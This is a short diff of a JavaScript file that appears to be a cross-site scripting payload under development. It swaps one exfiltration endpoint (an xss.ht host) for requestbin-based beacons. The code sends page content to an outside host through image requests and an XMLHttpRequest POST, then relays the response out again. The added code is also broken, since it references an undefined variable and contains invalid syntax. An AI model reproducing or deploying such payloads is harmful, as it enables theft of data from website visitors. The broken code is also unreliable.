@@ -12,7 +12,18 @@
 // xhr.send({toto='toto'});
 
 new Image().src="http://requestbin.fullcontact.com/10tmuur1?test="+document;
-new Image().src="https://kotter.xss.ht?test="+document;
+
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://requestbin.fullcontact.com/10tmuur1', true);
+xhr.onreadystatechange = function() { 
+  if (req.readyState == 4)
+    if (req.status == 200) {
+        var data = xhr.response;
+        new Image().src = "http://requestbin.fullcontact.com/10tmuur1?data=" + data;
+    }
+};
+
+xhr.send({toto='toto'});
 
 /*
 
